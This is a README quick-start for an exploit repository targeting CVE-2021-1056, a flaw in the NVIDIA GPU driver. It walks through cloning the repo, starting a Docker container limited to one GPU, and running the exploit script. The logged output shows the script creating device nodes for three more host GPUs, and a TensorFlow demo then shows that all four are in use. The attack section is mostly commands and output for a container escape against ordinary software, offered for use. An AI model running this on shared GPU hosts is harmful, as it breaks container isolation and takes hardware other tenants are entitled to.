# Quick Start

This document provides a brief intro of the usage of the exploit script.

* clone this repo

```bash
$ git clone https://github.com/pokerfaceSad/CVE-2021-1056.git
$ cd CVE-2021-1056
```



* start a container with only 1 GPU card and mount 

```bash
$ docker run --gpus 1 -v $PWD:/CVE-2021-1056 -it tensorflow/tensorflow:1.13.2-gpu bash
```



* check gpu status **in container**

```bash
# nvidia-smi
Sat Jan  9 07:21:03 2021       
+-----------------------------------------------------------------------------+
| NVIDIA-SMI 450.51.05    Driver Version: 450.51.05    CUDA Version: 11.0     |
|-------------------------------+----------------------+----------------------+
| GPU  Name        Persistence-M| Bus-Id        Disp.A | Volatile Uncorr. ECC |
| Fan  Temp  Perf  Pwr:Usage/Cap|         Memory-Usage | GPU-Util  Compute M. |
|                               |                      |               MIG M. |
|===============================+======================+======================|
|   0  Tesla V100-PCIE...  Off  | 00000000:02:00.0 Off |                    0 |
| N/A   27C    P0    23W / 250W |      0MiB / 32510MiB |      0%      Default |
|                               |                      |                  N/A |
+-------------------------------+----------------------+----------------------+
                                                                               
+-----------------------------------------------------------------------------+
| Processes:                                                                  |
|  GPU   GI   CI        PID   Type   Process name                  GPU Memory |
|        ID   ID                                                   Usage      |
|=============================================================================|
|  No running processes found                                                 |
+-----------------------------------------------------------------------------+
```



* execute script **in container**

```bash
# bash /CVE-2021-1056/main.sh
[INFO] init GPU num: 1
[DEBUG] /dev/nvidia0 exists, skip
[DEBUG] successfully get /dev/nvidia1
[DEBUG] successfully get /dev/nvidia2
[DEBUG] successfully get /dev/nvidia3
[DEBUG] delete redundant /dev/nvidia4
[INFO] get extra 3 GPU devices from host
[INFO] current GPU num: 4
[INFO] exec nvidia-smi:
Sat Jan  9 07:22:43 2021       
+-----------------------------------------------------------------------------+
| NVIDIA-SMI 450.51.05    Driver Version: 450.51.05    CUDA Version: 11.0     |
|-------------------------------+----------------------+----------------------+
| GPU  Name        Persistence-M| Bus-Id        Disp.A | Volatile Uncorr. ECC |
| Fan  Temp  Perf  Pwr:Usage/Cap|         Memory-Usage | GPU-Util  Compute M. |
|                               |                      |               MIG M. |
|===============================+======================+======================|
|   0  Tesla V100-PCIE...  Off  | 00000000:02:00.0 Off |                    0 |
| N/A   27C    P0    23W / 250W |      0MiB / 32510MiB |      0%      Default |
|                               |                      |                  N/A |
+-------------------------------+----------------------+----------------------+
|   1  Tesla V100-PCIE...  Off  | 00000000:03:00.0 Off |                    0 |
| N/A   30C    P0    25W / 250W |      0MiB / 32510MiB |      0%      Default |
|                               |                      |                  N/A |
+-------------------------------+----------------------+----------------------+
|   2  Tesla V100-PCIE...  Off  | 00000000:82:00.0 Off |                    0 |
| N/A   29C    P0    25W / 250W |      0MiB / 32510MiB |      0%      Default |
|                               |                      |                  N/A |
+-------------------------------+----------------------+----------------------+
|   3  Tesla V100-PCIE...  Off  | 00000000:83:00.0 Off |                    0 |
| N/A   28C    P0    25W / 250W |      0MiB / 32510MiB |      0%      Default |
|                               |                      |                  N/A |
+-------------------------------+----------------------+----------------------+
                                                                               
+-----------------------------------------------------------------------------+
| Processes:                                                                  |
|  GPU   GI   CI        PID   Type   Process name                  GPU Memory |
|        ID   ID                                                   Usage      |
|=============================================================================|
|  No running processes found                                                 |
+-----------------------------------------------------------------------------+
```



* run a tensorflow demo **in container** to ensure all the GPUs can indeed be accessed 

```bash
# nohup python /CVE-2021-1056/tf_distr_demo.py > log 2>&1 &
# nvidia-smi
Sat Jan  9 18:58:23 2021       
+-----------------------------------------------------------------------------+
| NVIDIA-SMI 450.51.05    Driver Version: 450.51.05    CUDA Version: 11.0     |
|-------------------------------+----------------------+----------------------+
| GPU  Name        Persistence-M| Bus-Id        Disp.A | Volatile Uncorr. ECC |
| Fan  Temp  Perf  Pwr:Usage/Cap|         Memory-Usage | GPU-Util  Compute M. |
|                               |                      |               MIG M. |
|===============================+======================+======================|
|   0  Tesla V100-PCIE...  Off  | 00000000:02:00.0 Off |                    0 |
| N/A   32C    P0    36W / 250W |  31117MiB / 32510MiB |      1%      Default |
|                               |                      |                  N/A |
+-------------------------------+----------------------+----------------------+
|   1  Tesla V100-PCIE...  Off  | 00000000:03:00.0 Off |                    0 |
| N/A   33C    P0    35W / 250W |  31117MiB / 32510MiB |      1%      Default |
|                               |                      |                  N/A |
+-------------------------------+----------------------+----------------------+
|   2  Tesla V100-PCIE...  Off  | 00000000:82:00.0 Off |                    0 |
| N/A   33C    P0    36W / 250W |  31117MiB / 32510MiB |      1%      Default |
|                               |                      |                  N/A |
+-------------------------------+----------------------+----------------------+
|   3  Tesla V100-PCIE...  Off  | 00000000:83:00.0 Off |                    0 |
| N/A   32C    P0    37W / 250W |  31117MiB / 32510MiB |      1%      Default |
|                               |                      |                  N/A |
+-------------------------------+----------------------+----------------------+
                                                                               
+-----------------------------------------------------------------------------+
| Processes:                                                                  |
|  GPU   GI   CI        PID   Type   Process name                  GPU Memory |
|        ID   ID                                                   Usage      |
|=============================================================================|
+-----------------------------------------------------------------------------+
```